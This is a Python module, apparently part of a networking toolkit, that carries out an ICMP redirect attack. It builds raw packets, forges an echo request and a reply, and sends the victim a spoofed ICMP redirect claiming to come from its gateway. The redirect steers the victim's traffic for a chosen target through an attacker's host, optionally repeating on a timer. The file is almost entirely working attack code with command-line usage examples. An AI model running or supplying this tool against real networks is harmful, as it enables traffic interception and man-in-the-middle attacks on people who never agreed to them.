"""ICMP Redirect utilities.

The module provides a script to perform an ICMP redirect attack.

Usage:
	python3 -m agave.icmp.redirect <target> <attacker> <victim> <gateway> [delta] 
		[trigger]

Example:
	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1 5
	python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1 5 1

"""
import socket, time, sys
from agave.models import ip, icmpv4
from agave.models.buffer import Buffer
from ipaddress import IPv4Address


def redirect(
	target: IPv4Address,
	attacker: IPv4Address,
	victim: IPv4Address,
	gateway: IPv4Address,
	trigger_echo_reply: bool = False,
	repeat_redirect: float = 0
):
	"""
	Using ICMP Redirect messages, informs <victim> that a better route (compared
	to the one with <gateway>) to reach <target> exists through <attacker>.
	ICMP Redirect messages must contain the original message which pushed the
	router to suggest an alternative way. For this scope, the function creates
	a fake ICMP echo reply message sent by <victim> to <target>. An additional
	ICMP echo request <target> to <victim> is created, and can be optionally
	sent to trigger <victim> into actually sending a reply similar to the fake
	one included in the ICMP redirect message.

	Args:
		target: <target> IP.
		attacker: IP of the router the <victim> should use to reach <target>.
		victim: <victim> IP.
		gateway: IP of the router the <victim> use to reach <target>.
		trigger_echo_reply: if true, the optional echo request is sent.
		repeat_redirect: delta time in seconds before to repeat the process. 0
			or less to prevent repetition.

	"""
	# Creates a raw socket and prevents kernel from adding the IP layer 
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
	# Builds the packet
	# 	Echo request sent by <target> to <victim>.
	buf_1 = Buffer.from_bytes()
	icmp_frame = icmpv4.ICMPv4.echo(b'abcdefghijklmnopqrstuvwyxz')
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_1)
	target_req = ip.IPv4.create_message(victim, target, bytes(buf_1), ip.PROTO_ICMP)
	# 	Guessed <victim> response to the echo request above.
	buf_2 = Buffer.from_bytes()
	icmp_frame = icmpv4.ICMPv4.reply(b'abcdefghijklmnopqrstuvwyxz')
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_2)
	victim_res = ip.IPv4.create_message(target, victim, bytes(buf_2), ip.PROTO_ICMP)
	# 	Malioucius redirect message from gateway.
	buf_3 = Buffer.from_bytes()
	icmp_frame = icmpv4.ICMPv4.redirect(
		icmpv4.REDIRECT_CODE_HOST,
		attacker._ip, 				# address of the router to use instead
		victim_res					# message that triggered the redirect
	)
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_3)
	redirect_mex = ip.IPv4.create_message(victim, gateway, bytes(buf_3), ip.PROTO_ICMP)
	# Send the data
	repeat_flag = repeat_redirect > 0
	while True:
		if trigger_echo_reply is True:
			# Trigger the victim to send an ICMP Echo reply to the target
			sock.sendto(target_req, (str(victim), 0))
			time.sleep(1)
		# Send redirect to the victim
		sock.sendto(redirect_mex, (str(victim), 0))
		# Break or sleep
		if not repeat_flag:
			break
		else:
			time.sleep(repeat_redirect)


if __name__ == "__main__":

	if len(sys.argv) < 5:
		print("Too few parameters")
	else:
		repeat = float(sys.argv[5]) if len(sys.argv) > 5 else 0
		trigger = (int(sys.argv[6]) > 0) if len(sys.argv) > 6 else False
		redirect(
			IPv4Address(sys.argv[1]),
			IPv4Address(sys.argv[2]),
			IPv4Address(sys.argv[3]),
			IPv4Address(sys.argv[4]),
			trigger_echo_reply=trigger,
			repeat_redirect=repeat
		)

